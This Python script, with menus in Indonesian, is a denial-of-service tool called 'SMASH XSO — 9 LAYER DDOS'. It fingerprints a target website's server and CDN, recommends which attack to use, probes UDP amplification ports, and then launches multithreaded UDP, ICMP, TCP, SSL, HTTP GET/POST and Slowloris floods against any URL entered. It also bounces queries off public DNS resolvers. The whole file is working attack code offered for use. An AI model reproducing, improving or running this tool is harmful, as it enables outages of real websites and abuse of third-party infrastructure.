#!/usr/bin/env python3
import socket
import threading
import requests
import random
import time
import sys
import os
from urllib.parse import urlparse

# ========== WARNA ANSI ==========
G = "\033[92m"
W = "\033[97m"
R = "\033[91m"
C = "\033[96m"
Y = "\033[93m"
N = "\033[0m"

# ========== CLEAR SCREEN ==========
os.system('clear' if os.name == 'posix' else 'cls')

# ========== BANNER ==========
banner = f"""
{G}
   ███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗
   ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║
   ███████╗██╔████╔██║███████║███████╗███████║
   ╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║
   ███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║
   ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

      ☠️  SMASH XSO — 9 LAYER DDOS  ☠️
{N}
"""

# ============================================================
# ============== FUNGSI CEK WEB =============================
# ============================================================

def cek_web():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(banner)
    print(f"{Y}╔══════════════════════════════════════════════╗{N}")
    print(f"{Y}║                CEK WEB                       ║{N}")
    print(f"{Y}╚══════════════════════════════════════════════╝{N}\n")

    target = input(f"{C}Masukkan URL target: {N}").strip()

    if not target.startswith("http"):
        target = "https://" + target

    parsed = urlparse(target)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"

    print(f"\n{C}[*] Menganalisis target...{N}\n")

    try:
        ip = socket.gethostbyname(host)
    except:
        print(f"{R}[!] Gagal resolve domain. Cek koneksi/URL.{N}")
        input(f"\n{C}Tekan Enter untuk kembali...{N}")
        return

    print(f"{G}[✓] Target : {W}{target}{N}")
    print(f"{G}[✓] IP     : {W}{ip}:{port}{N}")
    print()

    # ========== CEK HTTP RESPONSE ==========
    try:
        r = requests.get(target, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
        print(f"{G}[✓] HTTP Status  : {W}{r.status_code}{N}")
        print(f"{G}[✓] Server       : {W}{r.headers.get('Server', 'Unknown')}{N}")
        print(f"{G}[✓] Content-Type : {W}{r.headers.get('Content-Type', 'Unknown')}{N}")
    except Exception as e:
        print(f"{R}[!] HTTP Error: {e}{N}")

    print()

    # ========== CEK CLOUDFLARE ==========
    print(f"{Y}========== CEK PROTEKSI =========={N}")
    try:
        r = requests.get(target, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
        server = r.headers.get("Server", "").lower()
        cf_ray = r.headers.get("CF-RAY", None)
        cf_cache = r.headers.get("CF-Cache-Status", None)

        if "cloudflare" in server or cf_ray:
            print(f"{R}[!] Cloudflare TERDETEKSI{N}")
            print(f"{R}    → DDOS biasa GAK AKAN JALAN{N}")
            print(f"{R}    → Rekomendasi: HTTP Flood / Slowloris{N}")
            proteksi = "cloudflare"
        elif "vercel" in server:
            print(f"{R}[!] Vercel TERDETEKSI{N}")
            print(f"{R}    → Serverless, GAK BISA DI-DDOS{N}")
            proteksi = "vercel"
        elif "nginx" in server:
            print(f"{Y}[!] Nginx TERDETEKSI{N}")
            print(f"{G}    → Bisa di-DDOS pake UDP Flood Ultimate{N}")
            proteksi = "nginx"
        elif "apache" in server:
            print(f"{Y}[!] Apache TERDETEKSI{N}")
            print(f"{G}    → Bisa di-DDOS pake HTTP Flood / Slowloris{N}")
            proteksi = "apache"
        else:
            print(f"{G}[✓] Server: {server if server else 'Unknown'}{N}")
            print(f"{G}    → Bisa dicoba DDOS{N}")
            proteksi = "unknown"
    except:
        print(f"{R}[!] Gagal cek proteksi{N}")
        proteksi = "unknown"

    print()

    # ========== CEK PORT UDP ==========
    print(f"{Y}========== CEK PORT UDP =========={N}")
    udp_ports = [53, 123, 11211, 161, 389, 1900]
    port_names = {
        53: "DNS",
        123: "NTP",
        11211: "Memcached",
        161: "SNMP",
        389: "LDAP",
        1900: "SSDP"
    }

    for p in udp_ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            if p == 53:
                s.sendto(b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01", (ip, p))
            elif p == 123:
                s.sendto(b"\x17\x00\x03\x2a" + b"\x00" * 4, (ip, p))
            elif p == 11211:
                s.sendto(b"\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n", (ip, p))
            elif p == 161:
                s.sendto(b"\x30\x26\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63", (ip, p))
            elif p == 389:
                s.sendto(b"\x30\x0c\x02\x01\x01\x63\x07\x0a\x01\x00\x04\x00\x04\x00", (ip, p))
            elif p == 1900:
                s.sendto(b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n\r\n", (ip, p))

            try:
                data, _ = s.recvfrom(65535)
                print(f"{G}[✓] Port {p} ({port_names[p]}) AKTIF — Balasan {len(data)} bytes{N}")
            except:
                print(f"{R}[✗] Port {p} ({port_names[p]}) TERTUTUP{N}")
            s.close()
        except:
            print(f"{R}[✗] Port {p} ({port_names[p]}) ERROR{N}")

    print()

    # ========== REKOMENDASI ==========
    print(f"{Y}========== REKOMENDASI METHOD =========={N}")

    if proteksi == "cloudflare":
        print(f"{C}[1] HTTP Flood          → L7, ampuh buat web{N}")
        print(f"{C}[2] Slowloris           → L7, makan koneksi{N}")
        print(f"{C}[3] TCP SYN Flood       → L4, kalau ada celah{N}")
    elif proteksi == "vercel":
        print(f"{R}[!] Vercel GAK BISA DI-DDOS{N}")
        print(f"{R}    → Cari target lain{N}")
    elif proteksi == "nginx":
        print(f"{C}[1] UDP Flood Ultimate  → L4, TERKUAT{N}")
        print(f"{C}[2] DNS Amplification   → L5, kalau DNS aktif{N}")
        print(f"{C}[3] HTTP Flood          → L7, ampuh buat web{N}")
        print(f"{C}[4] Slowloris           → L7, makan koneksi{N}")
    elif proteksi == "apache":
        print(f"{C}[1] HTTP Flood          → L7, ampuh buat web{N}")
        print(f"{C}[2] Slowloris           → L7, makan koneksi{N}")
        print(f"{C}[3] HTTP POST Flood     → L7, ampuh buat form{N}")
        print(f"{C}[4] TCP SYN Flood       → L4, klasik{N}")
    else:
        print(f"{C}[1] UDP Flood Ultimate  → L4, TERKUAT{N}")
        print(f"{C}[2] DNS Amplification   → L5, amplifikasi{N}")
        print(f"{C}[3] HTTP Flood          → L7, ampuh buat web{N}")
        print(f"{C}[4] Slowloris           → L7, makan koneksi{N}")
        print(f"{C}[5] TCP SYN Flood       → L4, klasik{N}")

    input(f"\n{C}Tekan Enter untuk kembali ke menu utama...{N}")

# ============================================================
# ============== FUNGSI DDOS ================================
# ============================================================

def ddos_web():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(banner)

    # ========== INPUT DARI USER ==========
    print(f"{Y}╔══════════════════════════════════════════════╗{N}")
    print(f"{Y}║              KONFIGURASI SERANGAN            ║{N}")
    print(f"{Y}╚══════════════════════════════════════════════╝{N}\n")

    print(f"{C}[1] Target URL{N}")
    TARGET_URL = input(f"{W}    -> {N}").strip()

    print(f"\n{C}[2] Thread (800-1200){N}")
    THREAD_COUNT = int(input(f"{W}    -> {N}") or 1000)

    print(f"\n{C}[3] Waktu (0 = ∞){N}")
    DURATION = int(input(f"{W}    -> {N}") or 0)

    # ========== MENU METODE (URUT DARI TERKUAT) ==========
    print(f"\n{Y}╔══════════════════════════════════════════════╗{N}")
    print(f"{Y}║                  PILIH METHOD                ║{N}")
    print(f"{Y}╚══════════════════════════════════════════════╝{N}")
    print(f"{R}[1] UDP Flood Ultimate    ← TERKUAT (LOW THREAD){N}")
    print(f"{C}[2] DNS Amplification     ← Amplifikasi 30-60x{N}")
    print(f"{C}[3] ICMP Flood            ← Banjir paket (root){N}")
    print(f"{C}[4] TCP SYN Flood         ← Klasik ganas{N}")
    print(f"{C}[5] SSL Renegotiation     ← Makan CPU target{N}")
    print(f"{C}[6] HTTP Flood            ← Ampuh buat web{N}")
    print(f"{C}[7] HTTP POST Flood       ← Ampuh buat form/API{N}")
    print(f"{C}[8] Slowloris             ← Makan koneksi server{N}")
    print(f"{Y}[0] ALL METHODS           ← Acak semua{N}")

    method_choice = input(f"\n{C}👉 Pilih method (0-8): {N}").strip()

    # ========== PARSING TARGET ==========
    parsed = urlparse(TARGET_URL)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"

    try:
        ip = socket.gethostbyname(host)
    except:
        ip = host

    # ========== TAMPILKAN KONFIGURASI ==========
    print(f"\n{G}╔══════════════════════════════════════════════╗{N}")
    print(f"{G}║            KONFIGURASI FINAL                 ║{N}")
    print(f"{G}╚══════════════════════════════════════════════╝{N}")
    print(f"{G}  Target  : {W}{TARGET_URL}{N}")
    print(f"{G}  IP      : {W}{ip}:{port}{N}")
    print(f"{G}  Thread  : {W}{THREAD_COUNT}{N}")
    print(f"{G}  Waktu   : {W}{'Unlimited' if DURATION == 0 else f'{DURATION} detik'}{N}")
    print(f"{G}  Method  : {W}{method_choice}{N}")
    print(f"{G}═══════════════════════════════════════════════{N}\n")

    # ========== FLAG STOP ==========
    stop_attack = False

    # ============================================================
    # ============== METODE (URUT DARI TERKUAT) =================
    # ============================================================

    # ========== [1] UDP FLOOD ULTIMATE (TERKUAT - LOW THREAD) ==========
    def udp_flood_ultimate():
        nonlocal stop_attack
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 16)
        except:
            pass
        payload = random._urandom(65500)
        while not stop_attack:
            try:
                for _ in range(200):
                    s.sendto(payload, (ip, port))
            except:
                pass

    # ========== [2] DNS AMPLIFICATION ==========
    def dns_amp():
        nonlocal stop_attack
        dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "8.8.4.4", "1.0.0.1"]
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        query = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"
        while not stop_attack:
            try:
                for _ in range(50):
                    dns = random.choice(dns_servers)
                    s.sendto(query, (dns, 53))
                    s.sendto(query, (ip, 53))
            except:
                pass

    # ========== [3] ICMP FLOOD ==========
    def icmp_flood():
        nonlocal stop_attack
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            while not stop_attack:
                packet = b"\x08\x00" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00" + random._urandom(56)
                s.sendto(packet, (ip, 0))
        except:
            pass

    # ========== [4] TCP SYN FLOOD ==========
    def tcp_flood():
        nonlocal stop_attack
        while not stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect((ip, port))
                s.send(b"GET " + path.encode() + b" HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                s.close()
            except:
                pass

    # ========== [5] SSL RENEGOTIATION ==========
    def ssl_flood():
        nonlocal stop_attack
        try:
            import ssl
            context = ssl.create_default_context()
            while not stop_attack:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((ip, port))
                    ssl_sock = context.wrap_socket(sock, server_hostname=host)
                    ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                    ssl_sock.close()
                except:
                    pass
        except:
            pass

    # ========== [6] HTTP FLOOD ==========
    def http_flood():
        nonlocal stop_attack
        session = requests.Session()
        while not stop_attack:
            try:
                headers = {
                    "User-Agent": random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
                        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                    ]),
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Referer": "https://google.com",
                }
                rand_param = random.randint(1, 999999)
                session.get(f"{TARGET_URL}?id={rand_param}", headers=headers, timeout=2)
            except:
                pass

    # ========== [7] HTTP POST FLOOD ==========
    def http_post_flood():
        nonlocal stop_attack
        headers = {"User-Agent": "Mozilla/5.0"}
        while not stop_attack:
            try:
                data = {"random": random.randint(1, 999999), "data": random._urandom(100).hex()}
                requests.post(TARGET_URL, data=data, headers=headers, timeout=2)
            except:
                pass

    # ========== [8] SLOWLORIS ==========
    def slowloris():
        nonlocal stop_attack
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\n")
            s.send(b"Host: " + host.encode() + b"\r\n")
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            while not stop_attack:
                s.send(b"X-Header: " + str(random.randint(1, 9999)).encode() + b"\r\n")
                time.sleep(random.uniform(0.5, 3))
        except:
            pass

    # ========== DAFTAR METODE ==========
    all_methods = {
        "1": udp_flood_ultimate,
        "2": dns_amp,
        "3": icmp_flood,
        "4": tcp_flood,
        "5": ssl_flood,
        "6": http_flood,
        "7": http_post_flood,
        "8": slowloris,
    }

    # Pilih metode
    if method_choice == "0":
        selected_methods = list(all_methods.values())
        print(f"{G}[+] Menggunakan SEMUA method (acak){N}")
    else:
        if method_choice in all_methods:
            selected_methods = [all_methods[method_choice]]
            print(f"{G}[+] Menggunakan method: {method_choice}{N}")
        else:
            print(f"{R}[!] Pilihan tidak valid, menggunakan UDP Flood Ultimate.{N}")
            selected_methods = [udp_flood_ultimate]

    # Cek root
    if os.geteuid() != 0:
        if method_choice == "3" or method_choice == "0":
            print(f"{Y}[!] ICMP Flood membutuhkan root, lewati.{N}")
            if method_choice == "3":
                print(f"{Y}[!] Ganti ke UDP Flood Ultimate.{N}")
                selected_methods = [udp_flood_ultimate]

    # ========== THREADING ==========
    threads = []
    for i in range(THREAD_COUNT):
        attack_func = random.choice(selected_methods)
        t = threading.Thread(target=attack_func)
        t.daemon = True
        t.start()
        threads.append(t)

    print(f"\n{G}╔══════════════════════════════════════════════╗{N}")
    print(f"{G}║              SERANGAN DIMULAI!               ║{N}")
    print(f"{G}╚══════════════════════════════════════════════╝{N}")
    print(f"{C}  Tekan {R}CTRL + C{N}{C} untuk menghentikan serangan.{N}\n")

    # ========== DURASI & MONITOR ==========
    if DURATION > 0:
        try:
            time.sleep(DURATION)
            stop_attack = True
            print(f"\n{R}[!] Serangan selesai setelah {DURATION} detik.{N}")
        except KeyboardInterrupt:
            stop_attack = True
            print(f"\n{R}[!] Serangan dihentikan.{N}")
        input(f"\n{C}Tekan Enter untuk kembali ke menu utama...{N}")
        return

    try:
        while not stop_attack:
            time.sleep(5)
            print(f"{C}[+] Thread aktif: {threading.active_count()} | Target: {host}{N}")
    except KeyboardInterrupt:
        stop_attack = True
        print(f"\n{R}[!] CTRL+C diterima. Menghentikan serangan...{N}")
        print(f"{G}[✓] Serangan dihentikan.{N}")
        input(f"\n{C}Tekan Enter untuk kembali ke menu utama...{N}")

# ============================================================
# ============== MENU UTAMA =================================
# ============================================================

def menu_utama():
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(banner)

        print(f"{Y}╔══════════════════════════════════════════════╗{N}")
        print(f"{Y}║                 MENU UTAMA                   ║{N}")
        print(f"{Y}╚══════════════════════════════════════════════╝{N}")
        print(f"{R}[1] DDOS WEB{N}")
        print(f"{G}[2] CEK WEB{N}")
        print(f"{C}[0] EXIT{N}")
        print(f"{Y}═══════════════════════════════════════════════{N}")

        pilihan = input(f"\n{C}👉 Pilih menu (0-2): {N}").strip()

        if pilihan == "1":
            ddos_web()
        elif pilihan == "2":
            cek_web()
        elif pilihan == "0":
            print(f"\n{R}[!] Keluar...{N}")
            sys.exit()
        else:
            print(f"{R}[!] Pilihan tidak valid!{N}")
            time.sleep(1)

# ========== JALANKAN ==========
if __name__ == "__main__":
    menu_utama()
